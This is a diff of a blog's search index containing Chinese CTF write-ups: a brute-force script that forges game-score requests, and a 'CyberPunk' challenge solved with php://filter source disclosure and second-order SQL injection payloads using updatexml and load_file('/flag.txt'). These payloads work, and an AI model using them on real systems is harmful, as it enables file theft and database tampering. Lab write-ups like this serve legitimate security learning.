+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> ppp=<span class="string">&#x27;111.33.78.4&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> sign = Base64.encode(score.toString());</span><br><span class="line">xmlhttp.open(<span class="string">&quot;GET&quot;</span>,<span class="string">&quot;score.php?score=&quot;</span>+score+<span class="string">&quot;&amp;ip=&quot;</span>+ppp+<span class="string">&quot;&amp;sign=&quot;</span>+sign,<span class="literal">true</span>);</span><br><span class="line">xmlhttp.send();</span><br></pre></td></tr></table></figure>
+<h2 id="上burp"><a href="#上burp" class="headerlink" title="上burp"></a>上burp</h2><p>这里我以为是输入不够大，就试了更大的数，发现还是不对，然后随便玩了下游戏，用burp抓包，看一下发送到score.php的数据包，发现score和ip都和我们的形式一样，但是sign却不是25的base64编码，25的base64编码是MjU=，数据包里是zMMjU===，再尝试一下其他分数发现都是’zM’+base64(score)+’==’，所以可能是输入构造错了</p>
+<p><img src="https://i.loli.net/2021/05/11/jQdIAX7tmhfuK35.png" alt="3.png"></p>
+<p>然后将上面构造的输入改为<code>http://114.67.246.176:19820/score.php?score=6666&amp;ip=111.33.78.4.54&amp;sign=zMNjY2Ngo===</code>，发现返回了flag，果然是因为输入的格式问题</p>
+<p><img src="https://i.loli.net/2021/05/11/7RvHw3KTNhy62bC.png" alt="4.png"></p>
+<h2 id="写个脚本"><a href="#写个脚本" class="headerlink" title="写个脚本"></a>写个脚本</h2><p>那么这个分数的阈值究竟是啥，我们写个脚本来跑一下，这里从1000开始是因为我自己玩到了1000多分还是失败了</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://114.67.246.176:19820/score.php?score=&quot;</span></span><br><span class="line">url2=<span class="string">&quot;&amp;ip=111.33.78.4&amp;sign=zM&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">1000</span>,<span class="number">100000</span>):</span><br><span class="line">    i=<span class="built_in">str</span>(i)</span><br><span class="line">    j=b64encode(i.encode())</span><br><span class="line">    j=j.decode()</span><br><span class="line">    r=requests.get(url+i+url2+j+<span class="string">&#x27;==&#x27;</span>)</span><br><span class="line">    print(i)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;失败了&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="built_in">print</span> (r.text)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<p>最后发现到3000就出flag了</p>
+<p><img src="https://i.loli.net/2021/05/11/ZXNY1wpIJfvCdyx.png" alt="1.png"></p>
+]]></content>
+      <tags>
+        <tag>Bugku Web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CyberPunk</title>
+    <url>/2021/05/11/CyberPunk/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="CyberPunk"><a href="#CyberPunk" class="headerlink" title="CyberPunk"></a>CyberPunk</h1><blockquote>
+<p>2077发售了,不来份实体典藏版吗?</p>
+</blockquote>
+<p>进入环境，如下，第一个想法会不会是要找后台，尝试了admin.php发现没有，又尝试用御剑扫描，发现在扫描的时候操作网页会显示在忙，应该是对扫描进行了防护，那就可能不是扫描后台，这么多提交的表格，应该就是SQL注入。随便点几下看到有index.php、delete.php、change.php、search.php、confirm.php<br><img src="https://img-blog.csdnimg.cn/20210511155709383.png?x-oss-process=image"><br>查看网页源代码，在最下面发现了<code>&lt;!--?file=?--&gt;</code>，然后利用php伪协议进行读取源码<br><code>?file=php://filter/convert.base64-encode/resource=xxx.php</code><br>解析：</p>
+<blockquote>
+<p>首先这是一个file关键字的get参数传递，<br>php://是一种协议名称，php://filter/是一种访问本地文件的协议，<br>/read=convert.base64-encode/表示读取的方式是base64编码后，<br>resource=xxxx.php表示目标文件为xxx.php。</p>
+</blockquote>
+<p>以这种方式可以分别得到我们上面发现的页面的源码包括在源码中发现的config.php源码如下所示</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//index.php</span></span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="string">&#x27;/var/www/html/&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// $file = $_GET[&quot;file&quot;];</span></span><br><span class="line">$file = (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>]) ? $_GET[<span class="string">&#x27;file&#x27;</span>] : <span class="literal">null</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($file))&#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&quot;/phar|zip|bzip2|zlib|data|input|%00/i&quot;</span>,$file)) &#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&#x27;no way!&#x27;</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">include</span>($file);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//confirm.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"><span class="comment">//var_dump($_POST);</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">&quot;user_name&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">&quot;address&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">&quot;phone&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $msg = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    $pattern = <span class="string">&#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;</span>;</span><br><span class="line">    $user_name = $_POST[<span class="string">&quot;user_name&quot;</span>];</span><br><span class="line">    $address = $_POST[<span class="string">&quot;address&quot;</span>];</span><br><span class="line">    $phone = $_POST[<span class="string">&quot;phone&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123;</span><br><span class="line">        $msg = <span class="string">&#x27;no sql inject!&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $sql = <span class="string">&quot;select * from `user` where `user_name`=&#x27;<span class="subst">&#123;$user_name&#125;</span>&#x27; and `phone`=&#x27;<span class="subst">&#123;$phone&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">        $fetch = $db-&gt;query($sql);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($fetch-&gt;num_rows&gt;<span class="number">0</span>) &#123;</span><br><span class="line">        $msg = $user_name.<span class="string">&quot;已提交订单&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $sql = <span class="string">&quot;insert into `user` ( `user_name`, `address`, `phone`) values( ?, ?, ?)&quot;</span>;</span><br><span class="line">        $re = $db-&gt;prepare($sql);</span><br><span class="line">        $re-&gt;bind_param(<span class="string">&quot;sss&quot;</span>, $user_name, $address, $phone);</span><br><span class="line">        $re = $re-&gt;execute();</span><br><span class="line">        <span class="keyword">if</span>(!$re) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;error&#x27;</span>;</span><br><span class="line">            print_r($db-&gt;error);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $msg = <span class="string">&quot;订单提交成功&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $msg = <span class="string">&quot;信息不全&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//cnfig.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">ini_set(<span class="string">&quot;open_basedir&quot;</span>, getcwd() . <span class="string">&quot;:/etc:/tmp&quot;</span>);</span><br><span class="line"></span><br><span class="line">$DATABASE = <span class="keyword">array</span>(</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;host&quot;</span> =&gt; <span class="string">&quot;127.0.0.1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;username&quot;</span> =&gt; <span class="string">&quot;root&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;root&quot;</span>,</span><br><span class="line">    <span class="string">&quot;dbname&quot;</span> =&gt;<span class="string">&quot;ctfusers&quot;</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">$db = <span class="keyword">new</span> mysqli($DATABASE[<span class="string">&#x27;host&#x27;</span>],$DATABASE[<span class="string">&#x27;username&#x27;</span>],$DATABASE[<span class="string">&#x27;password&#x27;</span>],$DATABASE[<span class="string">&#x27;dbname&#x27;</span>]);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//search.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;config.php&quot;</span>; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">&quot;user_name&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">&quot;phone&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $msg = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    $pattern = <span class="string">&#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;</span>;</span><br><span class="line">    $user_name = $_POST[<span class="string">&quot;user_name&quot;</span>];</span><br><span class="line">    $phone = $_POST[<span class="string">&quot;phone&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123; </span><br><span class="line">        $msg = <span class="string">&#x27;no sql inject!&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $sql = <span class="string">&quot;select * from `user` where `user_name`=&#x27;<span class="subst">&#123;$user_name&#125;</span>&#x27; and `phone`=&#x27;<span class="subst">&#123;$phone&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">        $fetch = $db-&gt;query($sql);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        $row = $fetch-&gt;fetch_assoc();</span><br><span class="line">        <span class="keyword">if</span>(!$row) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;error&#x27;</span>;</span><br><span class="line">            print_r($db-&gt;error);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $msg = <span class="string">&quot;&lt;p&gt;姓名:&quot;</span>.$row[<span class="string">&#x27;user_name&#x27;</span>].<span class="string">&quot;&lt;/p&gt;&lt;p&gt;, 电话:&quot;</span>.$row[<span class="string">&#x27;phone&#x27;</span>].<span class="string">&quot;&lt;/p&gt;&lt;p&gt;, 地址:&quot;</span>.$row[<span class="string">&#x27;address&#x27;</span>].<span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = <span class="string">&quot;未找到订单!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    $msg = <span class="string">&quot;信息不全&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//delete.php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">&quot;user_name&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">&quot;phone&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $msg = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    $pattern = <span class="string">&#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;</span>;</span><br><span class="line">    $user_name = $_POST[<span class="string">&quot;user_name&quot;</span>];</span><br><span class="line">    $phone = $_POST[<span class="string">&quot;phone&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123; </span><br><span class="line">        $msg = <span class="string">&#x27;no sql inject!&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $sql = <span class="string">&quot;select * from `user` where `user_name`=&#x27;<span class="subst">&#123;$user_name&#125;</span>&#x27; and `phone`=&#x27;<span class="subst">&#123;$phone&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">        $fetch = $db-&gt;query($sql);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        $row = $fetch-&gt;fetch_assoc();</span><br><span class="line">        $result = $db-&gt;query(<span class="string">&#x27;delete from `user` where `user_id`=&#x27;</span> . $row[<span class="string">&quot;user_id&quot;</span>]);</span><br><span class="line">        <span class="keyword">if</span>(!$result) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;error&#x27;</span>;</span><br><span class="line">            print_r($db-&gt;error);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $msg = <span class="string">&quot;订单删除成功&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = <span class="string">&quot;未找到订单!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    $msg = <span class="string">&quot;信息不全&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//change.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">&quot;user_name&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">&quot;address&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">&quot;phone&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $msg = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    $pattern = <span class="string">&#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;</span>;</span><br><span class="line">    $user_name = $_POST[<span class="string">&quot;user_name&quot;</span>];</span><br><span class="line">    $address = addslashes($_POST[<span class="string">&quot;address&quot;</span>]);</span><br><span class="line">    $phone = $_POST[<span class="string">&quot;phone&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123;</span><br><span class="line">        $msg = <span class="string">&#x27;no sql inject!&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $sql = <span class="string">&quot;select * from `user` where `user_name`=&#x27;<span class="subst">&#123;$user_name&#125;</span>&#x27; and `phone`=&#x27;<span class="subst">&#123;$phone&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">        $fetch = $db-&gt;query($sql);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        $row = $fetch-&gt;fetch_assoc();</span><br><span class="line">        $sql = <span class="string">&quot;update `user` set `address`=&#x27;&quot;</span>.$address.<span class="string">&quot;&#x27;, `old_address`=&#x27;&quot;</span>.$row[<span class="string">&#x27;address&#x27;</span>].<span class="string">&quot;&#x27; where `user_id`=&quot;</span>.$row[<span class="string">&#x27;user_id&#x27;</span>];</span><br><span class="line">        $result = $db-&gt;query($sql);</span><br><span class="line">        <span class="keyword">if</span>(!$result) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;error&#x27;</span>;</span><br><span class="line">            print_r($db-&gt;error);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $msg = <span class="string">&quot;订单修改成功&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = <span class="string">&quot;未找到订单!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    $msg = <span class="string">&quot;信息不全&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>审查代码，发现所有php文件都对username与phone进行了过滤，防止sql注入，但是对于address并没有做过多的过滤，然后可以发现在change.php中对于address进行了操作，先是对其进行转义，然后进行更新操作，更新的时候会将老地址存起来</p>
+<blockquote>
+<p>addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。</p>
+</blockquote>
+<p>由于单引号之类的会被转义，无法直接进行注入，但是可以二次注入，具体思路是，提交订单时，地址写入我们的payload，然后进行地址更新，写入一个正常的数，便会触发报错注入，从而得到flag</p>
+<p>payload(因为updatexml最多回显32位)：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1&#x27; where user_id=updatexml(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">substr</span>(<span class="keyword">load_file</span>(<span class="string">&#x27;/flag.txt&#x27;</span>),<span class="number">1</span>,<span class="number">30</span>)),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1&#x27; where user_id=updatexml(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">substr</span>(<span class="keyword">load_file</span>(<span class="string">&#x27;/flag.txt&#x27;</span>),<span class="number">30</span>,<span class="number">60</span>)),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>UPDATEXML (XML_document, XPath_string, new_value);<br>第一个参数：XML_document是String格式，为XML文档对象的名称<br>第二个参数：XPath_string (Xpath格式的字符串)<br>第三个参数：new_value，String格式，替换查找到的符合条件的数据<br>concat()函数是将其连成一个字符串，因此不会符合XPATH_string的格式，从而出现格式错误，爆出我们查询的结果<br>0x7e ASCII码,实为~ upadtexml()报错信息为特殊字符、字母及之后的内容,为了前面字母丢失,开头连接一个特殊字符~</p>
+</blockquote>
+<p>先提交订单<br><img src="https://img-blog.csdnimg.cn/20210511174507150.png?x-oss-process=image"><br>再修改地址<br><img src="https://img-blog.csdnimg.cn/20210511174549439.png?x-oss-process=image" alt="在这里插入图片描述"><br>爆出前一段的flag</p>
+<p><img src="https://img-blog.csdnimg.cn/20210511174821456.png"><br>然后删除掉我们刚才的订单，重复上面流程，执行第二个payload，得到剩余flag，组合起来得到完整flag<br><img src="https://img-blog.csdnimg.cn/20210511175020845.png"></p>
+]]></content>
+      <tags>
+        <tag>2019Ciscn</tag>
       </tags>
   </entry>
 </search>
